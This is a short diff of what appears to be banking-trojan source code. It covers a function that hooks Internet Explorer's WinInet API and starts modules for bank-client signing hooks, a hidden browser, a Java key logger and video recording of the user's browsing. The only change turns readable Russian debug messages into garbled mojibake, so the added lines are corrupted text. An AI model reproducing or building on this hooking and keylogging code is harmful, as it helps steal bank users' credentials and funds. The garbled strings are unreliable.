@@ -1654,22 +1665,22 @@ bool HookInternetExplorerApi()
 	//-------------------------------------------------
 
 	#ifdef bsssignH
-		IEDBG("Инициализируем BSSSign");
+		IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BSSSign");
 		BSSSign::Initialize();
 	#endif
 
 	#ifdef StealthBrowserH
-		IEDBG("Инициализируем Скрытый браузер");
+		IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		SetHooksForSB();
 	#endif
 
 	#ifdef JavaKeyLogH
-		IEDBG("Инициализируем Java Key Logger");
+		IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Java Key Logger");
 		StartJavaKeyLogger();
 	#endif
 
   	#ifdef VideoRecorderH
-		IEDBG("Запускаем видео рекордер");
+		IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		StartVideoFromCurrentURL();
 	#endif
 
@@ -1677,7 +1688,7 @@ bool HookInternetExplorerApi()
 		BSSHooks();
 	#endif
 
-	IEDBG("Функции WinInet успешно перехвачены");
+	IEDBG("пїЅпїЅпїЅпїЅпїЅпїЅпїЅ WinInet пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	return true;
 }
